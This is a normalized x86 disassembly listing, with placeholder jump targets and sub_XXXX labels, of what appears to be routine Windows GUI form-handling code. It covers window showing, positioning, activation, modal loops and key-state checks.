sub eax edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x2e4 ]
jge r-xdata
pop esi
pop ebx
pop ebp
retn
sub esi ecx
mov [ ebx ] esi
sub_45a024
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x2e2 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_442b94
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov esi [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_458034
lea edx [ ebp - 0x14 ]
call sub_45b7fc
push ebp
mov eax [ ebp - 0x4 ]
call sub_458034
lea edx [ ebp - 0x24 ]
call sub_45b7fc
mov ecx [ ebp - 0x24 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0x14 ]
call sub_459ff8
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
call sub_458034
lea edx [ ebp - 0x24 ]
call sub_45b7fc
mov ecx [ ebp - 0x20 ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x10 ]
call sub_459ff8
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_459ff8
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4c ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x8 ]
call sub_459ff8
pop ecx
cmp [ eax + 0xc ] 0x0
je r-xdata
sub_45a0dc
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
or [ ebx + 0x2f4 ] 0x20
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_40349c
pop esi
pop ebx
retn
sub_45a100
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
and [ ebx + 0x2f4 ] 0xdf
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb1
call sub_40349c
pop esi
pop ebx
retn
sub_45a124
push ebx
push esi
mov esi edx
mov ebx eax
push 0x12
call GetKeyState
test ax ax
jl r-xdata
mov edx esi
mov eax ebx
call sub_443a74
mov ax [ esi + 0x4 ]
sub ax 0x9
je r-xdata
push 0x11
call GetKeyState
test ax ax
jl r-xdata
add eax 0xffffffe4
sub ax 0x4
jb r-xdata
push 0x1
push 0x10
call GetKeyState
test ax ax
setge cl
mov edx [ ebx + 0x220 ]
mov eax ebx
call sub_444b2c
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
mov dx [ esi + 0x4 ]
cmp dx 0x27
je r-xdata
mov cl 0x1
cmp dx 0x28
je r-xdata
xor ecx ecx
jmp r-xdata
mov edx [ eax + 0x30 ]
xchg edx eax
call sub_444b2c
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_45a1c0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45a72a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
call sub_45e8d4
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x4
xor edx edx
push ebp
push sub_45a70d
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a714
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
xor eax eax
push ebp
push j_sub_403740#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_40349c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
push ebp
push sub_45a278
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_40349c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45936c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_441b50
jmp r-xdata
mov eax [ rw-data ]
call sub_45ba58
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43d7fc
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_4445f8
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call SetWindowPos
jmp r-xdata
mov eax [ rw-data ]
call sub_45ba4c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43d840
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call IsIconic
test eax eax
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4445f8
call sub_454fc8
mov ebx eax
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_45ba88
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43d7fc
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_45ba58
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
push r-xdata
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_43e058
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_45ba7c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43d840
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_45ba4c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_45861c
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_45861c
jmp r-xdata
sub_45a27d
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45dfe8
call sub_403aa8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ rw-data ]
call sub_45ba58
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43d7fc
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_45ba4c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43d840
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_45ba88
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43d7fc
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_45ba58
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a714
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
push r-xdata
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_43e058
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_45ba7c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43d840
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_45ba4c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_45861c
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_45861c
jmp r-xdata
sub_45a619
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45dfe8
call sub_403aa8
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45936c
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_441b50
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_4445f8
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call SetWindowPos
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a714
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4445f8
call sub_454fc8
mov ebx eax
sub_45a760
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
retn
mov eax [ rw-data ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
sub_45a7b8
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
cmp [ esi + 0x59 ] 0x0
je r-xdata
pop esi
pop ecx
pop ebp
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d22c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45a816
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x68 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4032a0
retn
mov eax [ esi + 0x68 ]
mov edx [ edx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_45a824
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
mov si 0xffab
call sub_40349c
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45a850
push ebx
push esi
push ecx
mov ebx eax
test [ ebx + 0x2f4 ] 0x8
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov [ ebx + 0x24c ] 0x2
jmp r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov [ esp ] 0x1
test [ ebx + 0x228 ] 0x2
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov [ esp ] 0x3
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_45dfd4
jmp r-xdata
mov edx esp
mov eax ebx
mov si 0xffb0
call sub_40349c
cmp [ esp ] 0x0
je r-xdata
cmp [ esp ] 0x3
jne r-xdata
mov eax ebx
call sub_45a9f0
jmp r-xdata
mov eax ebx
call sub_45aa8c
mov dl 0x1
mov eax ebx
call sub_4585dc
jmp r-xdata
sub_45a8f4
push ebx
push esi
push edi
push ecx
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x29a ] 0x0
je r-xdata
mov [ esp ] 0x0
mov eax ebx
call sub_457f68
mov esi eax
dec esi
test esi esi
jl r-xdata
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x29c ]
call [ ebx + 0x298 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_457fb4
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
sub_45a958
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45a9c4
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x5 ] 0x1
lea edx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_40349c
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45aa8c
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45aa10
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_45aa7e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22e ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45aa85
lea eax [ ebp - 0x4 ]
call sub_404074
retn
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_459268
sub_45aaa8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45ad70
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_43c658
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call ReleaseCapture
mov eax [ rw-data ]
call sub_45cf48
xor edx edx
push ebp
push sub_45ad53
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x8
call GetActiveWindow
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov ecx [ eax + 0x78 ]
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
xor edx edx
call sub_413e60
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x78 ] edx
mov eax [ rw-data ]
mov ax [ eax + 0x44 ]
mov [ ebp - 0x12 ] ax
xor edx edx
mov eax [ rw-data ]
call sub_45bf78
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x18 ] eax
xor eax eax
call sub_454e78
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_45ad31
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_45a9f8
xor edx edx
push ebp
push sub_45ac90
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45a958
call GetCapture
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_45dd54
mov eax [ rw-data ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov [ ebp - 0x8 ] eax
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
call sub_4445f8
mov ebx eax
call GetActiveWindow
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ac97
mov eax [ ebp - 0x4 ]
call sub_45a9f0
retn
xor eax eax
mov [ ebp - 0x1c ] eax
sub_45ac97
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ad3b
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45bf78
mov dx [ ebp - 0x12 ]
mov eax [ rw-data ]
call sub_45bf78
jmp r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov eax ebx
call sub_413ddc
mov esi eax
mov eax [ rw-data ]
mov [ eax + 0x78 ] esi
mov edx esi
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
call sub_413f80
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_454f2c
mov eax [ rw-data ]
mov ebx [ eax + 0x7c ]
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xf7
retn
mov eax [ ebp - 0x1c ]
push eax
call SetActiveWindow
